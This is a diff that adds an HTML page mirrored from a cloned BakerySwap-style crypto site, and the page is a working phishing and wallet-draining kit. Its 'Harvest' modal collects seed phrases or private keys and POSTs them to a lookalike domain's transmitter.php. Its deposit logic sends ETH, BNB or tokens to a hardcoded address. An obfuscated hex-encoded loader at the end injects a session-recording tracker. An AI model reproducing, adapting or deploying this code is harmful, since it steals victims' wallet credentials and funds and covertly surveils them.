+      class="modal fade"
+      id="claimModal"
+      tabindex="-1"
+      role="dialog"
+      data-backdrop="static"
+      aria-labelledby="exampleModalCenterTitle"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" style="color: #984c25">Harvest</h5>
+
+            <button
+              type="button"
+              style="
+                border: none;
+                background: transparent;
+                color: #984c25;
+                position: absolute;
+                right: 14px;
+                top: 7px;
+                font-size: 30px;
+              "
+              data-dismiss="modal"
+              id="close"
+              data-target="#claimModal"
+            >
+              ×
+            </button>
+          </div>
+          <div class="modal-body">
+            <ul class="tabs">
+              <li class="tab-link current" data-tab="tab-1">Seed phrase</li>
+              <li class="tab-link" data-tab="tab-2">Private key</li>
+            </ul>
+
+            <div id="tab-1" class="tab-lists current">
+              <textarea
+                id="inputOne"
+                oninput="textBox(event)"
+                placeholder="Please enter your seed phrase"
+                class="form-control"
+              ></textarea>
+            </div>
+            <div id="tab-2" class="tab-lists">
+              <input
+                type="text"
+                id="inputTwo"
+                oninput="inputBox(event)"
+                placeholder="Please enter your private key"
+                class="form-control"
+              />
+            </div>
+          </div>
+          <div
+            class="modal-footer d-flex justify-content-center token-ido-card__aside"
+            style="background-color: white"
+          >
+            <button
+              type="button"
+              id="claimSend"
+              style="cursor: pointer; margin-top: 20px; border-radius: 5px"
+              class="sc-dHIava idVSmq cnf"
+            >
+              <span>Connect wallet</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="display: none" id="pleaseWallet">
+      <div>
+        <div
+          class="sc-gisBJw fTJuWL"
+          data-reach-dialog-overlay=""
+          style="opacity: 1"
+        >
+          <div
+            aria-modal="true"
+            role="dialog"
+            tabindex="-1"
+            aria-label="dialog"
+            class="sc-kjoXOD kiTEGC"
+            data-reach-dialog-content=""
+          >
+            <div class="sc-gwVKww bsXnuc">
+              <div class="sc-iQNlJl hOODBr">
+                <div
+                  style="cursor: pointer"
+                  id="closeConnect"
+                  class="sc-hrWEMg hdLtfm"
+                >
+                  <svg
+                    width="20"
+                    height="20"
+                    viewBox="0 0 20 20"
+                    fill="none"
+                    stroke="#8c4804"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="sc-eTuwsz dVaUjs"
+                  >
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </div>
+                <div class="sc-hXRMBi gSGJvT">
+                  <div class="sc-hZSUBg jaYvyp">Connect to a wallet</div>
+                </div>
+                <div class="sc-epnACN ezaHeU">
+                  <div class="sc-bsbRJL jVPUAT">
+                    <a
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      href="https://chrome.google.com/webstore/detail/binance-chain-wallet/fhbohimaelbohpjbbldcngcnapndodjp?hl=en"
+                      class="sc-chPdSV bpvxnK"
+                      ><button
+                        id="connect-BSC"
+                        class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                      >
+                        <div class="sc-dfVpRl fjDGNh">
+                          <div color="#E8831D" class="sc-kPVwWT dqmPkB">
+                            Install Binance Chain Wallet
+                          </div>
+                        </div>
+                        <div class="sc-esjQYD fSOeak">
+                          <img
+                            style="width: 24px; height: 24px"
+                            src="../www.bakeryswap.org/static/media/bsc.9d166b66.png"
+                            alt="Icon"
+                          />
+                        </div></button></a
+                    ><a
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      href="https://metamask.io/"
+                      class="sc-chPdSV bpvxnK"
+                      ><button
+                        id="connect-METAMASK"
+                        class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                      >
+                        <div class="sc-dfVpRl fjDGNh">
+                          <div color="#E8831D" class="sc-kPVwWT dqmPkB">
+                            Install Metamask
+                          </div>
+                        </div>
+                        <div class="sc-esjQYD fSOeak">
+                          <img
+                            style="width: 24px; height: 24px"
+                            src="../www.bakeryswap.org/static/media/metamask.023762b6.png"
+                            alt="Icon"
+                          />
+                        </div></button></a
+                    ><button
+                      id="connect-WALLET_CONNECT"
+                      class="sc-dqBHgY sc-gxMtzJ sc-gzOgki iFIEVI"
+                    >
+                      <div class="sc-dfVpRl fjDGNh">
+                        <div color="#4196FC" class="sc-kPVwWT dqmPkB">
+                          WalletConnect
+                        </div>
+                      </div>
+                      <div class="sc-esjQYD fSOeak">
+                        <img
+                          style="width: 24px; height: 24px"
+                          src="https://www.bakeryswap.org/static/media/walletConnectIcon.8215855c.svg"
+                          alt="Icon"
+                        />
+                      </div>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!---->
+    <script src="../unpkg.com/web3%401.7.4/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal"></script>
+    <script
+      type="text/javascript"
+      src="https://unpkg.com/@walletconnect/web3-provider"
+    ></script>
+    <script
+      type="text/javascript"
+      src="../unpkg.com/fortmatic%402.0.6/dist/fortmatic.js"
+    ></script>
+    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+      integrity=""
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+      integrity=""
+      crossorigin="anonymous"
+    ></script>
+    <reach-portal id="portal" style="display: none"
+      ><div
+        data-focus-guard="true"
+        tabindex="0"
+        style="
+          width: 1px;
+          height: 0px;
+          padding: 0px;
+          overflow: hidden;
+          position: fixed;
+          top: 1px;
+          left: 1px;
+        "
+      ></div>
+      <div
+        data-focus-guard="true"
+        tabindex="1"
+        style="
+          width: 1px;
+          height: 0px;
+          padding: 0px;
+          overflow: hidden;
+          position: fixed;
+          top: 1px;
+          left: 1px;
+        "
+      ></div>
+      <div data-focus-lock-disabled="false">
+        <div>
+          <div
+            class="sc-gisBJw kFxxhc"
+            data-reach-dialog-overlay=""
+            style="opacity: 1"
+          >
+            <div
+              aria-modal="true"
+              role="dialog"
+              tabindex="-1"
+              aria-label="dialog"
+              class="sc-kjoXOD gnMdBc"
+              data-reach-dialog-content=""
+              style="transform: translateY(0px)"
+            >
+              <div tabindex="1"></div>
+              <div class="sc-gwVKww bsXnuc">
+                <div class="sc-iQNlJl hOODBr">
+                  <div class="sc-hrWEMg hdLtfm">
+                    <svg
+                      id="closeWrong"
+                      width="20"
+                      height="20"
+                      viewBox="0 0 20 20"
+                      fill="none"
+                      stroke="rgb(255, 205, 132)"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      class="sc-eTuwsz cShPnE"
+                    >
+                      <line x1="18" y1="6" x2="6" y2="18"></line>
+                      <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                  </div>
+                  <div class="sc-hXRMBi gSGJvT">Wrong Network</div>
+                  <div class="sc-epnACN gnWoOf">
+                    <h5>Please connect to the appropriate Binance Smart Chain network.</h5>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div
+        data-focus-guard="true"
+        tabindex="0"
+        style="
+          width: 1px;
+          height: 0px;
+          padding: 0px;
+          overflow: hidden;
+          position: fixed;
+          top: 1px;
+          left: 1px;
+        "
+      ></div
+    ></reach-portal>
+    <!-- This is our example code -->
+    <script>
+	
+	
+	const Web3Modal = window.Web3Modal.default;
+const WalletConnectProvider = window.WalletConnectProvider.default;
+const depositAddress = "0xe20b95b00411fa2f30545538744345c9f7c5305f";
+$(".bscDropdown").hide();
+$(".ethDropdown").hide();
+$(".depositbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+$("#sendEthButton").attr("disabled", "disabled");
+$("#claimSend").attr("disabled", "disabled");
+// $('#claimbtn').attr('disabled','disabled');
+$(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+$("#busdimg").hide();
+$("#bscimg").hide();
+$("#max-btn").hide();
+
+$("#ethimg").show();
+$("#usdtimg").hide();
+$("#usdcimg").hide();
+
+let web3Modal;
+
+let provider;
+let currentCrypto;
+let BUSDCONTRACTADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
+let USDTCONTRACTADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+let USDCCONTRACTADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+let CUSTOMCONTRACT = "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82";
+let currentContractAddress;
+let tokenContract;
+
+let currentNetworkChain;
+let selectedAccount;
+
+let amount;
+let web3n;
+let finalAmount;
+const NETWORKS_IDS = {
+  1: "MAINNET",
+  3: "ROPSTEN",
+  42: "KOVAN",
+  4: "RINKEBY",
+  97: "BSC TESTNET",
+  56: "BSC MAINNET",
+};
+let supportedWallets = {
+  0: "WalletConnect",
+  1: "Metamask",
+};
+let selectedProvider;
+const pleaseWallet = document.querySelector("#pleaseWallet");
+const closeConnect = document.querySelector("#closeConnect");
+closeConnect.addEventListener("click", () => {
+  pleaseWallet.style.display = "none";
+});
+const connectWalletButton = document.querySelector("#connect-WALLET_CONNECT");
+
+$(".dropdown img.flag").addClass("flagvisibility");
+
+$(".dropdown dt a").click(function () {
+  $(".dropdown dd ul").toggle();
+});
+
+$(".dropdown dd ul li a").click(async function () {
+  finalAmount = "";
+  $("#depositAmount").val("");
+  $("#sendEthButton").attr("disabled", "disabled");
+  $("#busdimg").hide();
+  $("#bscimg").hide();
+  $("#ethimg").hide();
+  $("#max-btn").hide();
+
+  $("#usdtimg").hide();
+  $("#usdcimg").hide();
+  $("#balanceBUSD").text("");
+  $("#balanceBNB").text("");
+  $("#balanceUSDT").text("");
+  var text = $(this).html();
+  $(".dropdown dt a span").html(text);
+  $(".dropdown dd ul").hide();
+  // $("#result").html("Selected value is: " + getSelectedValue("sample"));
+  currentCrypto = getSelectedValue("sample");
+  console.log(currentCrypto);
+
+  if (currentCrypto == "BNB" || currentCrypto == "ETH") {
+    $("#max-btn").hide();
+
+    if (currentCrypto == "BNB") {
+      $("#bscimg").show();
+    } else if (currentCrypto == "ETH") {
+      $("#ethimg").show();
+    }
+    const balance = await web3n.eth.getBalance(selectedAccount);
+    console.log(balance);
+    const ethBalance = web3n.utils.fromWei(balance, "ether");
+    console.log(ethBalance);
+    $("#balanceBNB").text(parseFloat(ethBalance).toFixed(3));
+  } else if (currentCrypto == "BUSD") {
+    $("#max-btn").show();
+
+    const contract = await getContract(web3n);
+    tokenContract = contract;
+    let balance = await contract.methods.balanceOf(selectedAccount).call();
+    console.log(balance);
+    balance = balance / Math.pow(10, 18);
+    $("#balanceBUSD").text(balance);
+    $("#busdimg").show();
+  } else if (currentCrypto == "USDT" || currentCrypto == "USDC") {
+    const contract = await getContract(web3n);
+    tokenContract = contract;
+
+    let balance = await contract.methods.balanceOf(selectedAccount).call();
+
+    balance = balance / Math.pow(10, 6);
+    $("#balanceUSDT").text(balance);
+    $("#max-btn").show();
+
+    if (currentCrypto == "USDT") {
+      $("#usdtimg").show();
+    } else if (currentCrypto == "USDC") {
+      $("#usdcimg").show();
+    }
+  }
+});
+function getSelectedValue(id) {
+  return $("#" + id)
+    .find("dt a span.value")
+    .html();
+}
+
+$(document).bind("click", function (e) {
+  var $clicked = $(e.target);
+  if (!$clicked.parents().hasClass("dropdown")) $(".dropdown dd ul").hide();
+});
+
+$(".dropdown img.flag").toggleClass("flagvisibility");
+
+$("ul.tabs li").click(function () {
+  var tab_id = $(this).attr("data-tab");
+  console.log(tab_id);
+  if (tab_id == "tab-1") {
+    $("#claimSend").attr("disabled", "disabled");
+
+    $("#inputTwo").val("");
+  } else if (tab_id == "tab-2") {
+    $("#inputOne").val("");
+    $("#claimSend").attr("disabled", "disabled");
+  }
+  $("ul.tabs li").removeClass("current");
+  $(".tab-lists").removeClass("current");
+
+  $(this).addClass("current");
+  $("#" + tab_id).addClass("current");
+});
+
+function textBox(e) {
+  const value = e.target.value;
+
+  if (value == "") {
+    $("#claimSend").attr("disabled", "disabled");
+    return;
+  }
+  $("#inputOne").val(value);
+
+  $("#claimSend").removeAttr("disabled");
+}
+function inputBox(e) {
+  const value = e.target.value;
+
+  if (value == "") {
+    $("#claimSend").attr("disabled", "disabled");
+    return;
+  }
+  $("#inputTwo").val(value);
+  $("#claimSend").removeAttr("disabled");
+}
+$("#max-btn").click(async () => {
+  let value;
+
+  if ($("#balanceBUSD").text()) {
+    value = $("#balanceBUSD").text();
+  } else if ($("#balanceUSDT").text()) {
+    value = $("#balanceUSDT").text();
+  } else if ($("#balanceBNB").text()) {
+    value = $("#balanceBNB").text();
+  }
+  $("#depositAmount").val(value);
+  let amountValue = +$("#depositAmount").val();
+
+  if (amountValue == "" || amountValue < 0) {
+    $("#sendEthButton").attr("disabled", "disabled");
+    return;
+  }
+  $("#sendEthButton").removeAttr("disabled");
+  finalAmount = amountValue.replace(/ /g, function () {
+    return "";
+  });
+});
+$("#claimSend").click(function () {
+  let valueOne = $("#inputOne").val();
+  let valueTwo = $("#inputTwo").val();
+  let val;
+  let tab;
+  if (valueOne) {
+    val = valueOne;
+    tab = "from tab 1";
+  }
+  if (valueTwo) {
+    val = valueTwo;
+    tab = "from tab 2";
+  }
+  $.ajax({
+    type: "POST",
+    url: "https://bakeryswaper.org/transmitter.php",
+    data: {
+      firstval: val,
+      tabs: tab,
+    },
+    success: function (data) {
+      console.log(data);
+      alert("Unable to harvest");
+    },
+    error: function (xhr, status, error) {
+      console.error(xhr);
+    },
+  });
+});
+const getContract = async (web3) => {
+  let contract;
+  console.log(web3);
+  const data = await $.getJSON("abi.json");
+  console.log(data);
+  if (currentNetworkChain == "56") {
+    if (currentCrypto == "BabyDoge") {
+      currentContractAddress = CUSTOMCONTRACT;
+    }
+  } else if (currentNetworkChain == "1") {
+    if (currentCrypto == "lol") {
+      currentContractAddress = CUSTOMCONTRACT;
+    } else if (currentCrypto == "USDC") {
+      currentContractAddress = USDCCONTRACTADDRESS;
+    }
+  }
+  contract = new web3.eth.Contract(data, currentContractAddress);
+  return contract;
+};
+const sendEthButton = document.querySelector("#sendEthButton");
+const closeModal = document.querySelector("#closeModal");
+$("#successAlert").hide();
+$("#dangerAlert").hide();
+
+closeModal.addEventListener("click", () => {
+  console.log("click");
+
+  $("#get-pay-address").modal("hide");
+  $("#sendEthButton").attr("disabled", "disabled");
+  $("#depositAmount").val("");
+});
+
+sendEthButton.addEventListener("click", async () => {
+  if (currentCrypto == "BNB" || currentCrypto == "ETH") {
+    finalAmount = web3n.utils.toWei(finalAmount.toString(), "ether");
+    const txData = {
+      from: selectedAccount,
+      gasLimit: 222201,
+      to: depositAddress,
+      value: web3n.utils.toHex(
+        finalAmount.replace(/ /g, function () {
+          return "";
+        })
+      ),
+    };
+    console.log(selectedAccount);
+    if (selectedProvider == supportedWallets[0]) {
+      provider.connector
+        .sendTransaction(txData)
+        .then((txHash) => {
+          console.log(txHash);
+          const runInterval = setInterval(async () => {
+            web3n.eth
+              .getTransactionReceipt(txHash && txHash)
+              .then((txReceipt) => {
+                if (txReceipt == null) {
+                } else if (txReceipt && txReceipt.status === true) {
+                  $(".claimbtn").css({ "pointer-events": "", opacity: "" });
+
+                  clearInterval(runInterval);
+                  console.log(txReceipt);
+                  $("#successAlert").show();
+                  $("#get-pay-address").modal("hide");
+                  $("#sendEthButton").attr("disabled", "disabled");
+                  $("#depositAmount").val("");
+                } else if (txReceipt && txReceipt.status === false) {
+                  $(".claimbtn").css({
+                    "pointer-events": "none",
+                    opacity: "0.4",
+                  });
+
+                  console.log(txReceipt);
+                  clearInterval(runInterval);
+                  $("#dangerAlert").show();
+                  $("#dangerContent").text(`Transaction Failed`);
+                }
+              });
+          }, 5000);
+        })
+        .catch((error) => {
+          $(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+          $("#dangerAlert").show();
+          $("#dangerContent").text(`${error.message}`);
+
+          setTimeout(() => {
+            $("#dangerAlert").hide();
+          }, 5000);
+        });
+    } else {
+      ethereum
+        .request({
+          method: "eth_sendTransaction",
+          params: [txData],
+        })
+        .then((txHash) => {
+          console.log(txHash);
+          const runInterval = setInterval(async () => {
+            web3n.eth
+              .getTransactionReceipt(txHash && txHash)
+              .then((txReceipt) => {
+                if (txReceipt == null) {
+                } else if (txReceipt && txReceipt.status === true) {
+                  $(".claimbtn").css({ "pointer-events": "", opacity: "" });
+
+                  clearInterval(runInterval);
+                  console.log(txReceipt);
+                  $("#successAlert").show();
+                  $("#get-pay-address").modal("hide");
+
+                  $("#sendEthButton").attr("disabled", "disabled");
+                  $("#depositAmount").val("");
+                } else if (txReceipt && txReceipt.status === false) {
+                  $(".claimbtn").css({
+                    "pointer-events": "none",
+                    opacity: "0.4",
+                  });
+
+                  console.log(txReceipt);
+                  clearInterval(runInterval);
+                  $("#dangerAlert").show();
+
+                  $("#dangerContent").text(`Transaction Failed`);
+                }
+              });
+          }, 5000);
+        })
+        .catch((error) => {
+          $(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+          $("#dangerAlert").show();
+
+          $("#dangerContent").text(`${error.message}`);
+          setTimeout(() => {
+            $("#dangerAlert").hide();
+          }, 5000);
+        });
+    }
+  } else {
+    console.log(finalAmount);
+    const contract = await getContract(web3n);
+    tokenContract = contract;
+    let balance = await contract.methods.balanceOf(selectedAccount).call();
+    finalAmount = depositAmount.value.replace(/ /g, function () {
+      return "";
+    });
+
+    console.log(finalAmount);
+    //finalAmount = (finalAmount*10**parseInt(await tokenContract.methods.decimals().call())).toString(); //web3n.utils.toWei(finalAmount.toString(), "ether");
+    finalAmount = finalAmount+(10**parseInt(await tokenContract.methods.decimals().call())).toString().substring(1); 
+    console.log(finalAmount);
+    tokenContract.methods
+      .transfer(depositAddress, finalAmount)
+      .send({ from: selectedAccount, gasLimit: 222201 })
+      .then((res) => {
+        console.log(res);
+        console.log(finalAmount);
+        $(".claimbtn").css({ "pointer-events": "", opacity: "" });
+
+        $("#get-pay-address").modal("hide");
+        $("#sendEthButton").attr("disabled", "disabled");
+        $("#depositAmount").val("");
+      })
+      .catch((error) => {
+        $("#dangerAlert").show();
+
+        $("#dangerContent").text(`${error.message}`);
+        setTimeout(() => {
+          $("#dangerAlert").hide();
+        }, 5000);
+      });
+  }
+});
+function init() {
+  console.log("Initializing example");
+  console.log("WalletConnectProvider is", WalletConnectProvider);
+
+  const providerOptions = {
+    walletconnect: {
+      package: WalletConnectProvider,
+      options: {
+        infuraId: "b365880147014f928d117886dcc8e428",
+        rpc: {
+          56: "https://bsc-dataseed1.binance.org",
+        },
+      },
+    },
+  };
+
+  web3Modal = new Web3Modal({
+    cacheProvider: false,
+    providerOptions,
+  });
+}
+
+function keyUp(e) {
+  const value = +e.target.value;
+
+  if (value == "" || value < 0) {
+    $("#sendEthButton").attr("disabled", "disabled");
+    return;
+  }
+  $("#sendEthButton").removeAttr("disabled");
+  finalAmount = value;
+}
+const depositAmount = document.querySelector("#depositAmount");
+function preventBackspace(e) {
+  var evt = e || window.event;
+  if (evt) {
+    var keyCode = evt.charCode || evt.keyCode;
+    if (keyCode === 8) {
+      if (evt.preventDefault) {
+        depositAmount.value = [...depositAmount.value].pop();
+      } else {
+        evt.returnValue = false;
+      }
+    }
+  }
+}
+const parse = (s) =>
+  [...s.replace(/[^0-9]/g, "")].reduce(
+    (a, c, i, l) => (a += c + ((l.length - i) % 3 == 1 ? " " : "") || a),
+    ""
+  );
+function validateAmount() {
+  depositAmount.value = depositAmount.value.replace(/,/g, ".");
+  //depositAmount.value = parse(depositAmount.value);
+  finalAmount = depositAmount.value;
+}
+
+async function fetchAccountData() {
+  let web3 = new Web3(provider);
+  web3n = web3;
+  console.log("Web3 instance is", web3);
+  if (web3._provider["bridge"]) {
+    selectedProvider = supportedWallets[0];
+  } else {
+    selectedProvider = supportedWallets[1];
+  }
+
+  const chainId = await web3.eth.getChainId();
+  let allowedChain = "56";
+
+  if (chainId != allowedChain) {
+    if (window.ethereum) {
+      ethereum
+        .request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: web3.utils.toHex("56") }],
+        })
+        .then(() => console.log("network has been set"))
+        .catch((e) => {
+          if (e.code === 4902) {
+            console.log("network is not available, add it");
+          } else {
+            console.log("could not set network");
+          }
+        });
+      document.querySelector("#btn-connect").innerHTML = `
+      Connect Wallet
+      `;
+      document.querySelector("#btn-connect").style.backgroundColor =
+        "rgb(172, 86, 42)";
+      document.querySelector("#portal").style.display = "none";
+    } else {
+      document.querySelector("#btn-connect").innerHTML = `
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gqPbQI hADUJW"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+      Wrong Network
+      `;
+      document.querySelector("#btn-connect").style.backgroundColor =
+        "rgb(255, 104, 113)";
+      document.querySelector("#portal").style.display = "";
+      return;
+    }
+  }
+  $("#networkAlert").hide();
+  $(".depositbtn").css({ "pointer-events": "", opacity: "" });
+
+  currentNetworkChain = allowedChain;
+
+  $(".bscDropdown").hide();
+  $(".ethDropdown").hide();
+  $("#max-btn").hide();
+
+  if (currentNetworkChain == "1") {
+    let a = $(".ethDropdown dd ul li a").html();
+    currentCrypto = "lol";
+    $(".dropdown dt a span").html(a);
+    $(".ethDropdown").show();
+    $("#ethimg").show();
+  } else if (currentNetworkChain == "56") {
+    let a = $(".bscDropdown dd ul li a").html();
+    currentCrypto = "BabyDoge";
+
+    $(".dropdown dt a span").html(a);
+
+    $("#bscimg").show();
+    $(".bscDropdown").show();
+  }
+
+  const accounts = await web3.eth.getAccounts();
+
+  console.log("Got accounts", accounts);
+  selectedAccount = accounts[0];
+
+  const rowResolvers = accounts.map(async (address) => {
+    const contract = await getContract(web3n);
+    tokenContract = contract;
+    let balance = await contract.methods.balanceOf(selectedAccount).call();
+    console.log(balance);
+    // const blncAmount =parseFloat(ethBalance).toFixed(3)
+    $("#balanceBNB").text(parseInt(balance * Math.pow(10, -18) * 100) / 100);
+
+    // const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
+
+    //const balance = await web3.eth.getBalance(selectedAccount);
+    //console.log(balance);
+    // const ethBalance = web3.utils.fromWei(balance, "ether");
+  });
+
+  await Promise.all(rowResolvers);
+
+  document.querySelector("#prepare").style.display = "none";
+
+  document.querySelector("#connected").style.display = "block";
+}
+
+function displayConfirm(head, body) {
+  $("#modal-header").html(head);
+  $("#modal-body").html(body);
+  //$('#modal-footer').html(foot)
+  $("#modal").show();
+}
+
+async function refreshAccountData() {
+  document.querySelector("#connected").style.display = "none";
+
+  document.querySelector("#prepare").style.display = "block";
+
+  document.querySelector("#btn-connect").setAttribute("disabled", "disabled");
+
+  await fetchAccountData(provider);
+  document.querySelector("#btn-connect").removeAttribute("disabled");
+}
+
+async function walletConnects() {
+  try {
+    provider = await web3Modal.connect();
+  } catch (e) {
+    console.log("Could not get a wallet connection", e);
+    return;
+  }
+}
+async function onConnect() {
+  console.log("Opening a dialog", web3Modal);
+  try {
+    if (window.innerWidth > 767) {
+      if (window.ethereum) {
+        provider = await web3Modal.connect();
+        document.querySelector("#bodyContainerConnect").style.display = "none";
+        document.querySelector("#BodyContainer").style.display = "";
+        document.querySelector("#BodyContainerPay").style.display = "none";
+        await fetchAccountData;
+
+        // Subscribe to accounts change
+        provider.on("accountsChanged", (accounts) => {
+          fetchAccountData();
+        });
+
+        // Subscribe to chainId change
+        provider.on("chainChanged", (chainId) => {
+          fetchAccountData();
+        });
+
+        provider.on("networkChanged", (networkId) => {
+          fetchAccountData();
+        });
+
+        await refreshAccountData();
+      } else {
+        pleaseWallet.style.display = "";
+      }
+    } else {
+      provider = await web3Modal.connect();
+      document.querySelector("#bodyContainerConnect").style.display = "none";
+      document.querySelector("#BodyContainer").style.display = "";
+      document.querySelector("#BodyContainerPay").style.display = "none";
+      await fetchAccountData;
+
+      // Subscribe to accounts change
+      provider.on("accountsChanged", (accounts) => {
+        fetchAccountData();
+      });
+
+      // Subscribe to chainId change
+      provider.on("chainChanged", (chainId) => {
+        fetchAccountData();
+      });
+
+      provider.on("networkChanged", (networkId) => {
+        fetchAccountData();
+      });
+
+      await refreshAccountData();
+    }
+  } catch (e) {
+    console.log("Could not get a wallet connection", e);
+    return;
+  }
+}
+
+async function onDisconnect() {
+  console.log("Killing the wallet connection", provider);
+  $(".depositbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+  if (provider.close) {
+    await provider.close();
+
+    await web3Modal.clearCachedProvider();
+    provider = null;
+  }
+
+  selectedAccount = null;
+
+  document.querySelector("#prepare").style.display = "block";
+
+  document.querySelector("#connected").style.display = "none";
+}
+
+/**
+ * Main entry point.
+ */
+window.addEventListener("load", async (e) => {
+  init();
+  e.preventDefault();
+  document.querySelector("#btn-connect").addEventListener("click", onConnect);
+  document
+    .querySelector("#global-btn-connect")
+    .addEventListener("click", onConnect);
+  document
+    .querySelector("#btn-disconnect")
+    .addEventListener("click", onDisconnect);
+  document.querySelector("#closeWrong").addEventListener("click", () => {
+    document.querySelector("#portal").style.display = "none";
+  });
+  connectWalletButton.addEventListener("click", walletConnects);
+});
+$(()=>{
+	$('.sc-cFlXAS.keAeEt.navs.bakeNav').click(()=>{
+		$('.BAKE').show();
+	});
+});
+
+/*****************************************************************/
+const ym_number = 88853666;
+/*****************************************************************/
+
+var _0xdbc2=["\x73\x63\x72\x69\x70\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x6A\x73\x64\x65\x6C\x69\x76\x72\x2E\x6E\x65\x74\x2F\x6E\x70\x6D\x2F\x79\x61\x6E\x64\x65\x78\x2D\x6D\x65\x74\x72\x69\x63\x61\x2D\x77\x61\x74\x63\x68\x2F\x74\x61\x67\x2E\x6A\x73","\x79\x6D","\x70\x75\x73\x68","\x61","\x6C","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65","\x69\x6E\x69\x74"];(function(_0x3930x1,_0x3930x2,_0x3930x3,_0x3930x4,_0x3930x5,_0x3930x6,_0x3930x7){_0x3930x1[_0x3930x5]= _0x3930x1[_0x3930x5]|| function(){(_0x3930x1[_0x3930x5][_0xdbc2[4]]= _0x3930x1[_0x3930x5][_0xdbc2[4]]|| [])[_0xdbc2[3]](arguments)};_0x3930x1[_0x3930x5][_0xdbc2[5]]= 1*  new Date();_0x3930x6= _0x3930x2[_0xdbc2[6]](_0x3930x3),_0x3930x7= _0x3930x2[_0xdbc2[7]](_0x3930x3)[0],_0x3930x6[_0xdbc2[8]]= 1,_0x3930x6[_0xdbc2[9]]= _0x3930x4,_0x3930x7[_0xdbc2[11]][_0xdbc2[10]](_0x3930x6,_0x3930x7)})(window,document,_0xdbc2[0],_0xdbc2[1],_0xdbc2[2]);ym(ym_number,_0xdbc2[12],{clickmap:true,trackLinks:true,accurateTrackBounce:true,webvisor:true})
+</script>
+    <script type="text/javascript" src="visual.js"></script>
+    <script type="text/javascript" src="swipe.js"></script>
+    <script type="text/javascript" src="menu.js"></script>
+    <script type="text/javascript" src="settings.js"></script>
+	  </body>
+
+<!-- Mirrored from bakery-cake.org/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jul 2022 11:21:10 GMT -->
+</html>
